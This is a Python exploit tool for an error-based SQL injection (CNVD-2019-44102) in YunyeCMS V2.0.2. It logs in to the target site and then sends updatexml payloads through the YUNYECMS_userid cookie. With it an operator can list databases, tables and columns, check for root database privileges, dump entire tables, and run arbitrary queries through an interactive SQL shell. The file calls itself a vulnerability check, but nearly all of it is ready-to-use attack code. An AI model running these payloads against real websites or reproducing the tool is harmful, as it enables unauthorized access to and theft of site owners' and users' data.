#!/usr/bin/env python3
#
# Single check to see if the server is still vulnerable to CNVD-2019-44102
# Written by: 秋水
# Company: 泽鹿安全
#
# from pyfiglet import Figlet
from bs4 import BeautifulSoup
# import prettytable as pt
import time
import requests
import datetime
import optparse
import re

code = 'CNVD-2019-44102'
version = '1.0'
author = '秋水'
vulDate = '2020-04-09'
createDate = '2020-04-09'
updateDate = '2020-04-09'
name = '云业CMS前台存在SQL注入漏洞(CNVD-2019-44102)'
appPowerLink = 'http://www.yunyecms.com/'
appName = '云业CMS'
appVersion = '''云业CMS V2.0.2'''
way = '''python CNVD-2019-44102.py
              python CNVD-2019-44102.py -u http://127.0.0.1
              python CNVD-2019-44102.py -u http://127.0.0.1  --dba
              python CNVD-2019-44102.py -u http://127.0.0.1  --sql
              python CNVD-2019-44102.py -u http://127.0.0.1  -a 
              python CNVD-2019-44102.py -u http://127.0.0.1  -a -d yunyecms
              python CNVD-2019-44102.py -u http://127.0.0.1  -a -d yunyecms -t yunyecms_user 
              python CNVD-2019-44102.py -u http://127.0.0.1  -a -d yunyecms -t yunyecms_user -c username
              python CNVD-2019-44102.py -u http://127.0.0.1  -a -d yunyecms -t yunyecms_user --dump'''


# 打印当前时间
def nowtime():
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return now


# 程序结束
def endtime():
    print(" ")
    time.sleep(0.3)
    print("*] shutting down at %s" % datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


# 输出基本信息
def output():
    # f1 = Figlet(font='slant')  # 斜体 不slant是默认的字体 是不倾斜的
    # code1 = f1.renderText(code)
    # print(" ")
    # print(code1)  # 里面写需要的生成的文字，只支持英文
    print(" ")
    time.sleep(0.3)
    print("[*] 漏洞名称：%s" % name)
    time.sleep(0.3)
    print("[*] 影响版本：%s" % appVersion)
    time.sleep(0.3)
    print("[*] 使用方式：%s" % way)
    time.sleep(0.3)
    print("[*] 脚本版本：%s" % version)
    time.sleep(0.3)
    print("[*] 更新日期：%s" % updateDate)
    time.sleep(0.3)
    print("  ")
    print('''***********************************
           开始检测漏洞
***********************************''')
    print("  ")


# 转十六进制
def print_string_hex(data):
    lin = ['%02X' % ord(i) for i in data]
    data1 = "".join(lin)
    return data1


# 修改sql语句
def change_sql(sql):
    a = re.compile("'(.*)'")
    a1 = re.compile('"(.*)"')
    if a.findall(sql):
        b = a.findall(sql)[0]
        c = print_string_hex(b)
        d = "0x" + c
        ret = a.sub(d, sql)
        return ret
    elif a1.findall(sql):
        b = a1.findall(sql)[0]
        c = print_string_hex(b)
        d = "0x" + c
        ret = a1.sub(d, sql)
        return ret
    else:
        return sql


# 查找数据
def f(text):
    a = 0
    b = 0
    for s in text:
        if s == "~":
            a += 1
            b = a
        else:
            a += 1
    t = text[b:]
    c = t.find("'")
    count = t[:c]
    return count


# 检测漏洞
def check():
    try:
        address = url + "/index.php?m=member&c=member&a=login"
        rsp = session.get(address)
        text = rsp.text
        soup = BeautifulSoup(text, "html.parser")
        token = soup.find("input", {'name': 'token'}).get("value")
        data = {
            "username": "test",
            "pwd": "123456",
            "token": "%s" % token
        }
        time.sleep(0.3)
        print("[*] %s 正在登录..." % nowtime())
        rsp1 = session.post(address1, data=data)
        if rsp1.status_code == 200 and "登录成功" in str(rsp1.text):
            time.sleep(0.3)
            print("[+] 登录成功！")
            address2 = url + "/index.php?m=member&c=member&a=index"
            payload = "100'"
            session.cookies.set("YUNYECMS_userid", "%s" % payload)
            rsp2 = session.get(address2)
            text1 = rsp2.text
            if rsp1.status_code == 200 and "MySQL Error" in str(text1):
                time.sleep(0.3)
                print("[+] 目标网站存在注入")
                if options.all_db and not options.db and not options.table and not options.column:
                    # 获取数据库
                    get_db()
                elif options.dba:
                    is_dba()
                elif options.sql:
                    get_sql()
                elif options.all_db and options.db and not options.table and not options.column and not options.dump:
                    get_tables()
                elif options.all_db and options.db and options.table and not options.column and not options.dump:
                    get_columns()
                elif options.all_db and options.db and options.table and options.column and not options.dump:
                    get_info()
                elif options.all_db and options.db and options.table and options.dump and not options.column:
                    get_dump()
                else:
                    endtime()
            else:
                print("[-] 目标网站不存在该漏洞，或已被修复！")
                endtime()
        else:
            time.sleep(0.3)
            print("[-] 登录失败！")
            endtime()

    except requests.exceptions.ConnectionError:
        print("[-] 目标网站无法访问")
        endtime()
    except requests.exceptions.MissingSchema:
        print("[-] 目标网站格式不合法")
        endtime()


# 获取数据库名称
def get_db():
    payload = "100 and updatexml(1,concat(0x7e,(select count(*)from information_schema.schemata)),1)"
    session.cookies.set("YUNYECMS_userid", "%s" % payload)
    rsp = session.get(address1)
    text = rsp.text
    if rsp.status_code == 200 and "XPATH" in str(text):
        count = int(f(text))
        print("[*] %s 正在查询所有数据库名称，请稍后..." % nowtime())
        time.sleep(0.3)
        print("===========================")
        time.sleep(0.3)
        for i in range(0, count):
            payload1 = " 100 and updatexml(1,concat(0x7e,(select (schema_name)from information_schema.schemata limit"
            payload2 = " %s,1)),1)" % i
            payload3 = payload1 + payload2
            session.cookies.set("YUNYECMS_userid", "%s" % payload3)
            rsp1 = session.post(address1)
            text1 = rsp1.text
            if rsp1.status_code == 200 and "XPATH" in str(text1):
                print(f(text1))
                time.sleep(0.2)
            else:
                endtime()
        time.sleep(0.3)
        print("===========================")
        endtime()
    else:
        endtime()


# 获取数据表名称
def get_tables():
    db = options.db
    db1 = print_string_hex(db)
    p1 = "100 and updatexml(1,concat(0x7e,(select count(*)from information_schema.tables "
    p2 = "where table_schema=0x%s)),1)" % db1
    payload = p1 + p2
    session.cookies.set("YUNYECMS_userid", "%s" % payload)
    rsp = session.get(address1)
    text = rsp.text
    if rsp.status_code == 200 and "XPATH" in str(text):
        count = int(f(text))
        print("[*] %s 正在查询所有数据表名称，请稍后..." % nowtime())
        time.sleep(0.3)
        print("===========================")
        time.sleep(0.3)
        for i in range(0, count):
            payload1 = "100 and updatexml(1,concat(0x7e,(select (table_name)from information_schema.tables "
            payload2 = "where table_schema=0x%s limit %s,1)),1)" % (db1, i)
            payload3 = payload1 + payload2
            session.cookies.set("YUNYECMS_userid", "%s" % payload3)
            rsp1 = session.get(address1)
            text1 = rsp1.text
            if rsp1.status_code == 200 and "XPATH" in str(text1):
                print(f(text1))
                time.sleep(0.2)
            else:
                endtime()
        time.sleep(0.3)
        print("===========================")
        endtime()
    else:
        endtime()


# 获取字段名称
def get_columns():
    table = options.table
    table1 = print_string_hex(table)
    p1 = "100 and updatexml(1,concat(0x7e,(select count(*)from information_schema.columns "
    p2 = "where table_name=0x%s)),1)" % table1
    payload = p1 + p2
    session.cookies.set("YUNYECMS_userid", "%s" % payload)
    rsp = session.get(address1)
    text = rsp.text
    if rsp.status_code == 200 and "XPATH" in str(text):
        count = int(f(text))
        print("[*] %s 正在查询%s表的字段名称，请稍后..." % (nowtime(), table))
        time.sleep(0.3)
        print("===========================")
        time.sleep(0.3)
        for i in range(0, count):
            payload1 = "100 and updatexml(1,concat(0x7e,(select (column_name)from information_schema.columns "
            payload2 = "where table_name=0x%s limit %s,1)),1)" % (table1, i)
            payload3 = payload1 + payload2
            session.cookies.set("YUNYECMS_userid", "%s" % payload3)
            rsp1 = session.get(address1)
            text1 = rsp1.text
            # print(text1)
            if rsp1.status_code == 200 and "XPATH" in str(text1):
                print(f(text1))
                time.sleep(0.2)
            else:
                endtime()
        time.sleep(0.3)
        print("===========================")
        endtime()
    else:
        endtime()


# 获取字段数据
def get_info():
    db = options.db
    table = options.table
    column = options.column
    payload = "100 and updatexml(1,concat(0x7e,(select count(*)from %s.%s)),1)" % (db, table)
    session.cookies.set("YUNYECMS_userid", "%s" % payload)
    rsp = session.get(address1)
    text = rsp.text
    if rsp.status_code == 200 and "XPATH" in str(text):
        count = int(f(text))
        print("[*] %s 正在查询%s表的%s字段的数据，请稍后..." % (nowtime(), table, column))
        time.sleep(0.3)
        print("===========================")
        time.sleep(0.3)
        for i in range(0, count):
            payload1 = "100 and updatexml(1,concat(0x7e,(select (%s)from %s.%s " % (column, db, table)
            payload2 = "limit %s,1)),1)" % i
            payload3 = payload1 + payload2
            session.cookies.set("YUNYECMS_userid", "%s" % payload3)
            rsp1 = session.get(address1)
            text1 = rsp1.text
            # print(text1)
            if rsp1.status_code == 200 and "XPATH" in str(text1):
                print(f(text1))
                time.sleep(0.2)
            else:
                endtime()
        time.sleep(0.3)
        print("===========================")
        endtime()
    else:
        endtime()


# 获取单个表所有数据
def get_dump():
    db = options.db
    table = options.table
    table1 = print_string_hex(table)
    p1 = "100 and updatexml(1,concat(0x7e,(select count(*)from information_schema.columns "
    p2 = "where table_name=0x%s)),1)" % table1
    payload = p1 + p2
    session.cookies.set("YUNYECMS_userid", "%s" % payload)
    rsp = session.get(address1)
    text = rsp.text
    payload4 = "100 and updatexml(1,concat(0x7e,(select count(*)from %s.%s)),1)" % (db, table)
    session.cookies.set("YUNYECMS_userid", "%s" % payload4)
    rsp2 = session.get(address1)
    text2 = rsp2.text
    if rsp.status_code == 200 and "XPATH" in str(text):
        count: int = int(f(text))
        if rsp2.status_code == 200 and "XPATH" in str(text2):
            count1 = int(f(text2))
            print("[*] %s 正在查询%s表的字段名称，请稍后..." % (nowtime(), table))
            time.sleep(0.3)
            print("[*] %s 正在查询%s表的的数据，请稍后..." % (nowtime(), table))
            # tb = pt.PrettyTable()
            for i in range(0, count1):
                row = []
                table_title = []
                for j in range(0, count):
                    payload1 = "100 and updatexml(1,concat(0x7e,(select (column_name)from information_schema.columns "
                    payload2 = "where table_name=0x%s limit %s,1)),1)" % (table1, j)
                    payload3 = payload1 + payload2
                    session.cookies.set("YUNYECMS_userid", "%s" % payload3)
                    rsp1 = session.get(address1)
                    text1 = rsp1.text
                    if rsp1.status_code == 200 and "XPATH" in str(text1):
                        field_name = str(f(text1))
                        table_title.append(field_name)
                        column = str(f(text1))
                        payload5 = "100 and updatexml(1,concat(0x7e,(select (%s)from %s.%s " % (column, db, table)
                        payload6 = "limit %s,1)),1)" % i
                        payload7 = payload5 + payload6
                        session.cookies.set("YUNYECMS_userid", "%s" % payload7)
                        rsp3 = session.get(address1)
                        text3 = rsp3.text
                        if rsp3.status_code == 200 and "XPATH" in str(text3):
                            table_data = str(f(text3))
                            row.append(table_data)
                        else:
                            table_data = None
                            row.append(table_data)
                    else:
                        endtime()
                tb.field_names = table_title
                tb.add_row(row)
            print(tb)
        time.sleep(0.3)
        endtime()
    else:
        endtime()


# 查看权限
def is_dba():
    payload = "100 and updatexml(1,concat(0x7e,(user())),1)"
    session.cookies.set("YUNYECMS_userid", "%s" % payload)
    rsp = session.get(address1)
    text = rsp.text
    if rsp.status_code == 200 and "XPATH" in str(text):
        count = str(f(text))
        if "root" in count:
            time.sleep(0.3)
            print("[+] 数据库是root权限!")
            endtime()
        else:
            time.sleep(0.3)
            print("[-] 权限不足！")
            endtime()
    else:
        time.sleep(0.3)
        print("[-] 权限不足！")
        endtime()


# 获取sql_shell
def get_sql():
    while True:
        sql = input("sql>>")
        if sql == "exit":
            endtime()
            break
        else:
            ret = re.search(r'select ', sql, re.I)
            ret1 = re.search(r' from', sql, re.I)
            ret2 = re.search(r'select', sql, re.I)
            ret3 = re.search(r'from', sql, re.I)
            if ret1 and ret:
                sql = sql.replace("select ", "select (")
                sql = sql.replace(" from", ")from")
            elif ret1 and ret2 and not ret:
                sql = sql.replace("select", "select (")
                sql = sql.replace(" from", ")from")
            elif ret2 and ret3 and not ret and not ret1:
                sql = sql.replace("select", "select (")
                sql = sql.replace("from", ")from")
            elif not ret and not ret1 and not ret2 and not ret3:
                sql = sql
            elif ret and ret2 and ret3 and not ret2:
                sql = sql
            else:
                print("[-] 请检查sql语句格式")
            sql = change_sql(sql)
            payload = "100 and updatexml(1,concat(0x7e,(%s)),1)" % sql
            session.cookies.set("YUNYECMS_userid", "%s" % payload)
            rsp = session.get(address1)
            text = rsp.text
            if rsp.status_code == 200 and "XPATH" in str(text):
                count = str(f(text))
                print("执行结果：%s" % count)
                continue
            else:
                print("[-] 执行失败，请检查是否为单条查询以及SQL语句格式！")
                continue


if __name__ == "__main__":
    # noinspection PyBroadException
    try:
        usage = "python %prog -u/-U <target url> -f/-F <Directory name>"  # 用于显示帮助信息
        parser = optparse.OptionParser(usage)  # 创建对象实例
        parser.add_option('-u', '-U', dest='url', action='store', help='target url',
                          default=False)  # 需要的命令行参数
        parser.add_option('--dba', dest='dba', action='store_true', help='IS DBA', default=False)
        parser.add_option('-a', '-A', dest='all_db', action='store_true', help='all database', default=False)
        parser.add_option('-d', '-D', dest='db', action='store', help='database', default=False)
        parser.add_option("-t", '-T', dest='table', action='store', help='TableName', default=False)
        parser.add_option("-c", '-C', dest='column', action='store', help='ColumnName', default=False)
        parser.add_option('--dump', dest='dump', action='store_true', help='dump', default=False)
        parser.add_option('--sql', dest='sql', action='store_true', help='sql_shell', default=False)
        (options, args) = parser.parse_args()
        session = requests.session()
        if options.url:
            url = options.url
            address1 = url + "/index.php?m=member&c=member&a=logincheck"
            all_db = options.all_db
            output()
            check()
        else:
            parser.print_help()
            endtime()

    except BaseException as e:
        print("[-] 请输入参数值！")
        endtime()
